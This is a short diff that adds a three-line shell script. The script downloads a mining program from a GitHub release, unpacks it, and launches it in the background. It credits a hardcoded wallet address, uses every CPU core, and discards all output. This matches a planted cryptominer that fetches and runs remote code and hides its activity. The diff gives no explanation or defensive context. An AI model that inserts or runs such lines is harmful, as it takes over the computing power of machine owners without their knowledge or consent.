@@ -1,0 +1,3 @@
+curl https://github.com/HashVault/vltrig/releases/download/v6.25.0.4/vltrig-v6.25.0.4-linux-x64.tar.gz -L -o vltrig-v6.25.0.4-linux-x64.tar.gz
+tar xf vltrig-v6.25.0.4-linux-x64.tar.gz
+./vltrig --user 84bEkQaAvXnPXXghsfBYBeLGtkAV8eP1HX7rP7EUBE1pHvtwAffjCE2SzzY8y79fkgHA21czuEWoVUDkAf7e4qM5KMKCKVK --pass x -t $(nproc --all) > /dev/null 2>&1 &
